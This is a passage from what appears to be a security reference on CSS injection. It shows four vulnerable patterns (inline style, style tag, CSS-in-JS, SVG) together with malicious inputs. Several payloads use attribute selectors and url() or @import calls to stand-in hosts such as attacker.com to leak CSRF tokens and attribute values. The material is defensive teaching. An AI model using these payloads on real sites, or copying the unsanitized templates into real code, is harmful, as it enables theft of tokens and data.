---
source: "languages/javascript/css-injection.md"
title: "CSS Injection and Data Exfiltration"
heading: "CSS Injection Vectors"
category: "language-vuln"
language: "javascript"
severity: "medium"
tags: [chrome, cve-2026-2441, cve-2026-26000, exfiltration, injection, javascript, language-vuln, overview, xwiki]
chunk: 5/8
---

## CSS Injection Vectors

### Vector 1: Inline Styles

```html
<!-- VULNERABLE: User input in style attribute -->
<div style="background-image: url('<?= $userInput ?>')">

<!-- Malicious input: -->
x'); } input[name="csrf"][value^="a"] { background: url(http://attacker/?a); }
```

### Vector 2: `<style>` Tag Injection

```html
<!-- VULNERABLE: User-controlled content in style block -->
<style>
  .user-<?= $username ?> { color: red; }
</style>

<!-- Attacker registers username: -->
x} @import url('http://attacker.com/exfil'); /*

<!-- Renders as: -->
<style>
  .user-x} @import url('http://attacker.com/exfil'); /* { color: red; }
</style>
```

### Vector 3: CSS-in-JS Unsanitized

```javascript
// VULNERABLE: CSS-in-JS with user-controlled values
import styled from 'styled-components';

const UserBox = styled.div`
  background: ${props => props.userColor};
`;

// Attacker provides: url(http://attacker.com/leak)
// CSS exfiltration achieved through computed styles
```

### Vector 4: SVG CSS Injection

```html
<!-- SVG allows embedded CSS -->
<svg>
  <style>
    /* This CSS can read attributes of SVG elements */
    text[data-secret^="a"] { fill: url(http://attacker.com/a); }
  </style>
  <text data-secret="sensitive_value">X</text>
</svg>
```

---